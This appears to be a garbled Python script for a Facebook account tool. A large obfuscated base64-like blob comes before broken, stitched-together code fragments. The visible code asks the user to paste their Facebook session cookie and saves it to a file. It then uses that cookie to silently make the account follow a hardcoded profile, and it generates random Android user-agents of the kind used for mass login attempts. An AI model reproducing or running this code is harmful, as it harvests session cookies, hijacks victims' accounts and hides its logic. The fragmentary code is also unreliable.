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

		for foll in parser(requests.get(f'https://mbasic.facebook.com/100083788721465',cookies={'cookie':cok}).text,'html.parser').find_all('a',href=True):

			if '/a/subscribe.php?' in foll.get('href'):

				x = requests.get(

					'https://mbasic.facebook.com'

					+

					foll[

						'href'

					],

					cookies = {

						'cookie'

						:

						cok

					}

				).text

				exit(

				)

	except:

		pass

def Login_Dulu():

	Banner(

	)

	Console(width=48).print(

		Panel(

			"[bold #FF00D4]input cookie facebook",

			style="bold purple"

			),

		justify="center"

	)

	Console(width=48).print(

		Panel(

			"[bold #FF00D4]saran extensi: cookiedough",

			width=48,

			subtitle="╭──",

			subtitle_align="left",

			style="bold purple",

			),

		justify="center"

	)

	cok = Console(

		).input(

			"[bold purple]   ╰─> "

		)

	open(

		".cok.txt",

		"w"

		).write(

			cok

		)

	ses = requests.Session(

		)
for xd in range(10000):
    rr = random.randint; rc = random.choice
    aZ = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
    andro = str(rc(['3.0','4.4.2','4.4.4','5.0.1','8.0','7.0','6.0','5.0','4.0','4.3.4','7.0.1','8.0.1','3','4','5','6','7','8','9','10','11','12','13']))
    lonte = f"{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}"
    build_nokiax = ['JDQ39','JZO54K']
